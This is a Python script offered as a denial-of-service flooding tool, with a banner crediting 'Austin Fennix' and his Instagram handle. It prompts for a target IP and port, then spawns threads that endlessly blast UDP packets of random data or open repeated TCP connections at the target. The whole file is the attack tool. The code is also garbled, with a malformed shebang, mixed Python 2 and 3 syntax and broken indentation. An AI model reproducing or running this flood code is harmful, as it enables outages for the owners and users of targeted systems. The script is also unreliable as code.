#i/usr/bin/env python3
#DDOS BY AUSTIN FENNIX
import random
import socket
import threading
import os 
import sys


os.system("clear")
print " ,444444,   44   44  .44444   4444444  44  44.    44       44"
print "44      44  44   44 4           44     44  44 4   44         "
print "4444444444  44   44  .44444.    44     44  44 44  44       44"
print "44      44  44   44         4   44     44  44  44 44       44"
print "44      44  4444444  444444'    44     44  44    .44       44"  
print "_____________________________________________________________"
print " Follow my Instagram : @tdyfnnx_"
print " -Dont Abuse or i share your ip- "
print " TOOLS BY AUSTIN FENNIX!"
print "_____________________________________________________________"
    ip=str(input("ByAustin. IP:"))
    port=int(input("ByAustin. PORT:"))
    choice=str(input("Attack?(y/n):"))
    times=int(input("Connections?:"))
    threads=int(input("Threads Attack?:"))
def run():
    data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"Austin Nih bang")
		except:
			print("[!] AUSTIN IS HERE!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"DONT PANIC!!")
		except:
			s.close()
			print("[*] AUSTIN IS HERE!!EROR404")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
